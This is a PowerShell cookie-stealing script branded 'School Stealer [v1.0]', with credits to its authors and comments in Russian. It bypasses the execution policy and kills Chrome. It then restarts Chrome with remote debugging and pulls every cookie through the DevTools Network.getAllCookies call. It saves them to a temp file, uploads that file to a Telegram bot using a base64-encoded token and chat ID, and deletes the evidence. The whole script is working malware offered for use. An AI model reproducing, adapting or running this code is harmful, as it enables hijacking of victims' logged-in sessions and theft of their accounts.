Clear
Write-Host " ,d88b.d88b,                                   " -ForegroundColor Magenta
Write-Host " 88888888888    School Stealer [v1.0]            " -ForegroundColor Magenta
Write-Host " 'Y8888888Y'    By SigmaBoy                    " -ForegroundColor Magenta
Write-Host "   'Y888Y'                                     " -ForegroundColor Magenta
Write-Host "     'Y'                                       " -ForegroundColor Magenta
Write-Host " "

# Bypass Execution Policy
try {
    Write-Host "Bypassing Execution Policy..."
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force # Allows the script to run bypassing the default execution policies.
    Start-Sleep -Seconds 1
    Write-Host "Bypassed!" -ForegroundColor Green
} catch {
    Write-Host "Error: Unable to Bypass Execution Policy. Proceeding without Bypass." -ForegroundColor Red
}

Write-Host "Created by @kryyaasoft" -ForegroundColor Blue
Write-Host "Created by @kryyaasoft" -ForegroundColor Green
Write-Host "Created by @kryyaasoft" -ForegroundColor Blue
Write-Host "Created by @kryyaasoft" -ForegroundColor Green
Write-Host "Created by @kryyaasoft" -ForegroundColor Blue
Write-Host "Created by @kryyaasoft" -ForegroundColor Green
Write-Host "Created by @kryyaasoft" -ForegroundColor Blue

function Send-FileToTelegram {
    param (
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [Parameter(Mandatory=$true)]
        [string]$ChatId,
        [Parameter(Mandatory=$true)]
        [string]$BotToken
    )

    $url = "https://api.telegram.org/bot$BotToken/sendDocument"
    $fileContent = Get-Content -Path $FilePath -Raw

    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatId,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/json",
            "",
            $fileContent,
            "--$boundary--"
        )

        $body = $bodyLines -join "`r`n"
        $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
        Write-Host "File sent to Telegram: $($response.ok)"
    } catch {
        Write-Error "Failed to send file to Telegram: $_"
    }
}

$remoteDebuggingPort = 9222
$URL = "https://google.com"

function quitx(){
    if (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) {
        Stop-Process -Name "chrome" -Force
    }
}

function SendReceiveWebSocketMessage {
    param (
        [string] $WebSocketUrl,
        [string] $Message
    )

    try {
        $WebSocket = [System.Net.WebSockets.ClientWebSocket]::new()
        $CancellationToken = [System.Threading.CancellationToken]::None
        $connectTask = $WebSocket.ConnectAsync([System.Uri] $WebSocketUrl, $CancellationToken)
        [void]$connectTask.Result
        if ($WebSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "WebSocket connection failed. State: $($WebSocket.State)"
        }
        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
        $buffer = [System.ArraySegment[byte]]::new($messageBytes)
        $sendTask = $WebSocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CancellationToken)
        [void]$sendTask.Result
        $receivedData = New-Object System.Collections.Generic.List[byte]
        $ReceiveBuffer = New-Object byte[] 4096 # Adjust the buffer size as needed
        $ReceiveBufferSegment = [System.ArraySegment[byte]]::new($ReceiveBuffer)

        while ($true) {
            $receiveResult = $WebSocket.ReceiveAsync($ReceiveBufferSegment, $CancellationToken)
            if ($receiveResult.Result.Count -gt 0) {
                $receivedData.AddRange([byte[]]($ReceiveBufferSegment.Array)[0..($receiveResult.Result.Count - 1)])
            }
            if ($receiveResult.Result.EndOfMessage) {
                break
            }
        }
        $ReceivedMessage = [System.Text.Encoding]::UTF8.GetString($receivedData.ToArray())
        $WebSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "WebSocket closed", $CancellationToken)
        return $ReceivedMessage
    } catch {
        throw $_
    }
}

quitx

#$username = $env:USERNAME
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$process = Start-Process -FilePath $chromePath -ArgumentList $URL, "--remote-debugging-port=$remoteDebuggingPort", "--remote-allow-origins=ws://localhost:$remoteDebuggingPort"
$jsonUrl = "http://localhost:$remoteDebuggingPort/json"
$jsonData = Invoke-RestMethod -Uri $jsonUrl -Method Get
$url_capture = $jsonData.webSocketDebuggerUrl
$Message = '{"id": 1,"method":"Network.getAllCookies"}'

if ($url_capture[0].Length -ge 2) {
    $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[0] -Message $Message
} else {
    $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture -Message $Message
}

# Извлекаем JSON-часть из ответа с помощью регулярного выражения
try {
    # Используем регулярное выражение для поиска JSON в ответе
    $jsonPattern = '\{.*\}'
    $jsonMatch = [regex]::Match($response, $jsonPattern)
    if ($jsonMatch.Success) {
        $jsonResponse = $jsonMatch.Value | ConvertFrom-Json
        if ($jsonResponse -and $jsonResponse.result) {
            $jsonResponse = $jsonResponse.result
        } else {
            throw "Invalid JSON response: $jsonResponse"
        }
    } else {
        throw "No JSON found in the response."
    }
} catch {
    Write-Error "Failed to parse JSON response: $_"
    exit 1
}

# Сохраняем JSON в файл
$tempFilePath = "$env:TEMP\Cookies.json"
$jsonResponse | ConvertTo-Json -Depth 10 | Out-File -FilePath $tempFilePath -Encoding UTF8

# Отправка файла в Telegram
# Base64 строка (закодированный токен)
$EncBotToken = "NzY3NzM4Njc0MTpBQUZyZzVmTTdwQlBjR2VsanNQSTlCeHlIQXhYc0J6b1dsOA=="
$EncChatId = "MTUyMTEzMjEyNw=="

$BotToken = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncBotToken))
$ChatId = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncChatId))

Send-FileToTelegram -FilePath $tempFilePath -ChatId $chatId -BotToken $botToken

# Удаляем временный файл
Remove-Item -Path $tempFilePath -Force

quitx
